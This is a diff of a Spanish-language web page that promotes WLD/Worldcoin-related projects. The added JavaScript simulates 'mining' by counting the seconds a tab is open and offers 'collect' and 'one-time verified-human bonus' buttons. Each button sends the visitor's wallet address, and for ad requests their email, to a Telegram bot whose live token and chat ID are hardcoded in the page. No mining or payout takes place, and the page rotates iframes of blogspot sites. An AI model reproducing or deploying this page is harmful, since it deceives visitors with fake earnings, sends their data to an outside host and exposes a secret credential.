@@ -1,50 +1,5 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Promociona tu Proyecto</title>
-  <style>
-    body {
-      text-align: center;
-      padding: 20px;
-      font-family: Arial, sans-serif;
-    }
-    #iframeContainer {
-      width: 100%;
-      height: 500px;
-      border: 2px solid #ccc;
-      margin-top: 20px;
-      overflow: hidden;
-      border-radius: 10px;
-    }
-    iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-    #resultado {
-      margin-top: 20px;
-    }
-    input, button {
-      margin: 10px;
-      padding: 10px;
-      width: 80%;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    button {
-      background-color: #4CAF50;
-      color: white;
-      cursor: pointer;
-      font-size: 16px;
-      transition: background-color 0.3s;
-    }
-    button:hover {
-      background-color: #45a049;
-    }
-  </style>
-</head>
+<!-- ... Sección head y estilos se mantiene igual ... -->
+
 <body>
 
 <h2>Promociona tu Blog, Video o Proyecto relacionado con WLD o Tokens</h2>
@@ -64,12 +19,28 @@
   <button onclick="guardarDatos()">Comprar Publicidad</button>
 </div>
 
+<hr>
+
 <button onclick="pararMineria()">Parar Mineria</button>
+<input type="text" id="walletParar" placeholder="Tu billetera para detener minería" />
+<button onclick="continuarMineria()">Continuar Mineria</button>
+
+<hr>
+
+<h3>Cobrar CHC y CHUN</h3>
+<input type="text" id="walletCobro" placeholder="Tu billetera WorldChain" />
+<button onclick="cobrar()">Cobrar</button>
+
+<h3>Bono único por Humano Verificado</h3>
+<input type="text" id="walletBono" placeholder="Tu billetera WorldChain para bono" />
+<p style="color: orange;">Este bono solo se puede cobrar una vez. Verifica tu ID y espera más bonos.</p>
+<button onclick="cobrarBono()">Cobrar Bono Único</button>
 
 <script>
   let tiempoTotal = 0;
   let interval;
   let minando = true;
+  let ventanaActiva = true;
 
   const telegramToken = '8010490851:AAGXRC8_OlcfCeL53VgJ_ALqmbRuT691Wlk';
   const chatId = '7613604212';
@@ -87,13 +58,43 @@
     "https://gmcas77.blogspot.com"
   ];
 
+  document.addEventListener("visibilitychange", () => {
+    ventanaActiva = !document.hidden;
+  });
+
   function redireccionAleatoria() {
     const indiceAleatorio = Math.floor(Math.random() * urls.length);
-    const urlRedireccion = urls[indiceAleatorio];
-    document.getElementById('iframeRedireccion').src = urlRedireccion;
+    document.getElementById('iframeRedireccion').src = urls[indiceAleatorio];
     setTimeout(redireccionAleatoria, 10000);
   }
   redireccionAleatoria();
+
+  function contarTiempo() {
+    if (minando && ventanaActiva) {
+      tiempoTotal++;
+      if (tiempoTotal % 100 === 0) {
+        alert(`¡Has ganado 100 CHC!`);
+        enviarMensajeTelegram(`¡Usuario ha ganado 100 CHC!`);
+      }
+    }
+  }
+  interval = setInterval(contarTiempo, 1000);
+
+  function pararMineria() {
+    clearInterval(interval);
+    minando = false;
+    const wallet = document.getElementById('walletParar').value;
+    alert(`Ganaste ${tiempoTotal} CHC! Gracias por usar la página.`);
+    enviarMensajeTelegram(`Minería detenida.\nGanancia: ${tiempoTotal} CHC\nWallet: ${wallet}`);
+  }
+
+  function continuarMineria() {
+    if (!minando) {
+      interval = setInterval(contarTiempo, 1000);
+      minando = true;
+      alert('Minería reanudada.');
+    }
+  }
 
   function guardarDatos() {
     const walletUsuario = document.getElementById('walletUsuario').value;
@@ -105,52 +106,46 @@
       return;
     }
 
-    const mensaje = `Publicidad Solicitada:\nWallet Usuario: ${walletUsuario}\nCorreo: ${correo}\nURL Promocion: ${urlPromocion}`;
+    const mensaje = `Publicidad Solicitada:\nWallet: ${walletUsuario}\nCorreo: ${correo}\nURL: ${urlPromocion}`;
     enviarMensajeTelegram(mensaje);
-    alert('Tu solicitud ha sido enviada por Telegram. Recibirás confirmación en breve.');
+    alert('Tu solicitud ha sido enviada. Recibirás confirmación en breve.');
   }
 
-  function pararMineria() {
+  function cobrar() {
+    const wallet = document.getElementById('walletCobro').value;
+    if (!wallet) {
+      alert('Por favor ingresa tu billetera WLD.');
+      return;
+    }
+    enviarMensajeTelegram(`Solicitud de COBRO CHC/CHUN\nWallet: ${wallet}\nGanancia: ${tiempoTotal} CHC`);
+    alert('Tu pago se está procesando...');
     clearInterval(interval);
     minando = false;
-    alert(`Ganaste ${tiempoTotal} CHC! Gracias por usar la página.`);
-    enviarMensajeTelegram(`Minería detenida. Ganancia: ${tiempoTotal} CHC`);
   }
 
-  function contarTiempo() {
-    if (minando) {
-      tiempoTotal++;
-      if (tiempoTotal % 100 === 0) {
-        alert(`¡Has ganado 100 CHC!`);
-        enviarMensajeTelegram(`¡Usuario ha ganado 100 CHC!`);
-      }
+  function cobrarBono() {
+    const wallet = document.getElementById('walletBono').value;
+    if (!wallet) {
+      alert('Por favor ingresa tu billetera para el bono.');
+      return;
     }
+    enviarMensajeTelegram(`Solicitud de BONO ÚNICO CHC/CHUN\nWallet: ${wallet}`);
+    alert('Tu bono único está siendo procesado. Solo puede cobrarse una vez.');
   }
-
-  interval = setInterval(contarTiempo, 1000);
 
   function enviarMensajeTelegram(mensaje) {
     const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
     fetch(url, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: mensaje
-      })
-    })
-    .then(response => response.json())
-    .then(data => {
-      if (!data.ok) console.error('Error al enviar mensaje:', data);
-    })
-    .catch(error => console.error('Error en la solicitud a Telegram:', error));
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: mensaje })
+    }).then(response => response.json())
+      .then(data => { if (!data.ok) console.error('Telegram error:', data); })
+      .catch(error => console.error('Telegram fetch error:', error));
   }
 
   function abrirGuia() {
-    const iframe = document.getElementById("iframeRedireccion");
-    iframe.src = "./enviarwld.html";
+    document.getElementById("iframeRedireccion").src = "./enviarwld.html";
   }
 </script>
 
